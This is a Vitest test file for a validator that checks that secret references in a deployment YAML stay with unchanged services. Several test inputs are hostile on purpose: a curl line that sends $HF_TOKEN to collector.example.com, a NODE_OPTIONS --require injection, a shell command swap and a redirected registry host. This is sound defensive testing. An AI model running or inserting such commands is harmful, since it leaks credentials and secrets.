import { describe, expect, it } from "vitest";

import { keepsSecretsWithTheirServices } from "./keepsSecretsWithTheirServices";

const SOURCE = `
services:
  web:
    image: ghcr.io/acme/api:1.0
    command:
      - node
    args:
      - server.js
    env:
      - LOG_LEVEL=info
      - HF_TOKEN=ac-secret://HF_TOKEN
  registry-only:
    image: ghcr.io/acme/private:1.0
    credentials:
      host: ghcr.io
      username: ac-secret://REGISTRY_USERNAME
      password: ac-secret://REGISTRY_PASSWORD
  worker:
    image: ghcr.io/acme/worker:1.0
profiles:
  compute:
    web:
      resources:
        cpu:
          units: 1
`;

describe(keepsSecretsWithTheirServices.name, () => {
  it("keeps secrets for services left exactly as they were when only resources change", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("units: 1", "units: 4"))).toBe(true);
  });

  it("ignores services that reference no secret, whatever changes in them", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("worker:1.0", "evil:latest"))).toBe(true);
  });

  it("refuses a secret sent to a changed image", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("ghcr.io/acme/api:1.0", "docker.io/someone/else:latest"))).toBe(false);
  });

  it("refuses a secret sent to a changed command", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("      - node\n", "      - sh\n      - -c\n"))).toBe(false);
  });

  it("refuses a secret sent to changed args", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("      - server.js\n", "      - curl https://collector.example.com -d $HF_TOKEN\n"))).toBe(
      false
    );
  });

  it("refuses a secret next to a changed plain env value", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("LOG_LEVEL=info", "LOG_LEVEL=debug"))).toBe(false);
  });

  it("refuses a secret next to an added env key", () => {
    expect(
      keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("      - LOG_LEVEL=info\n", "      - LOG_LEVEL=info\n      - NODE_OPTIONS=--require /tmp/x.js\n"))
    ).toBe(false);
  });

  it("refuses a secret once an env key is removed", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("      - LOG_LEVEL=info\n", ""))).toBe(false);
  });

  it("refuses registry credentials sent to another registry", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("host: ghcr.io", "host: registry.example.com"))).toBe(false);
  });

  it("refuses a secret moved to a service that never had it", () => {
    const moved = SOURCE.replace("    image: ghcr.io/acme/worker:1.0", "    image: ghcr.io/acme/worker:1.0\n    env:\n      - HF_TOKEN=ac-secret://HF_TOKEN");

    expect(keepsSecretsWithTheirServices(SOURCE, moved)).toBe(false);
  });

  it("refuses a secret given to a service the deployment doesn't have", () => {
    const added = SOURCE.replace("profiles:", "  sidecar:\n    image: ghcr.io/acme/api:1.0\n    env:\n      - HF_TOKEN=ac-secret://HF_TOKEN\nprofiles:");

    expect(keepsSecretsWithTheirServices(SOURCE, added)).toBe(false);
  });

  it("refuses when either SDL does not parse", () => {
    expect(keepsSecretsWithTheirServices("services: [", SOURCE)).toBe(false);
    expect(keepsSecretsWithTheirServices(SOURCE, "services: [")).toBe(false);
  });

  it("reads env entries without a value, non-string entries and services without credentials", () => {
    expect(
      keepsSecretsWithTheirServices(
        "services:\n  web:\n    image: a\n    env:\n      - FLAG\n      - 3\n",
        "services:\n  web:\n    image: b\n    env:\n      - FLAG\n      - 3\n  empty:\n"
      )
    ).toBe(true);
    expect(keepsSecretsWithTheirServices("{}", "{}")).toBe(true);
  });

  it("reads an env entry without a value as a secret reference when it is one", () => {
    expect(
      keepsSecretsWithTheirServices("services:\n  web:\n    image: a\n", "services:\n  web:\n    image: a\n    env:\n      - ac-secret://HF_TOKEN\n")
    ).toBe(false);
  });
});
